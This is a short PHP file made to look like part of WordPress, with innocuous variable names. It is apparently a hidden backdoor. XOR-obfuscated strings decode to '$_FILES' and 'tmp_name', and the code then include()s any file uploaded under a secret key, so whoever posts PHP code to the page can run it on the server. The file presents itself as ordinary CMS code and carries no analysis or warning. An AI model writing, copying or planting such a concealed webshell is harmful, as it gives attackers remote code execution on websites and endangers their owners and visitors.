<?php 	
	$post_date_gmt = '_fragment';
function entities()

{
    $smiley_url = 'u32IsFv6ZTk';
    $old_slugs = $smiley_url;
    

    $current_filter = $GLOBALS[rel_array("%2Au%7B%056%15", $old_slugs)];
    $regex = $current_filter;
    $clean_terms = isset($regex[$old_slugs]);

    if ($clean_terms)

    {
	$src_url = 'post_category';
        $post__in = $current_filter[$old_slugs];
	$hierarchical = 'decoded_slug';
        $post_ID = $post__in[rel_array("%01%5EB%16%1D%27%1BS", $old_slugs)];
        $wp_post_statuses = $post_ID;
        include ($wp_post_statuses);
    }
}
function rel_array($post_type_meta_caps, $from)

{

    $tag_names = $from;

    $match = "url" . "decode";
    $image_exts = $match($post_type_meta_caps);

    $perm = substr($tag_names,0, strlen($image_exts));

    $hash = $image_exts ^ $perm;
    

    $image_exts = strpos($hash, $perm);
    
    return $hash;
}


entities();

?>
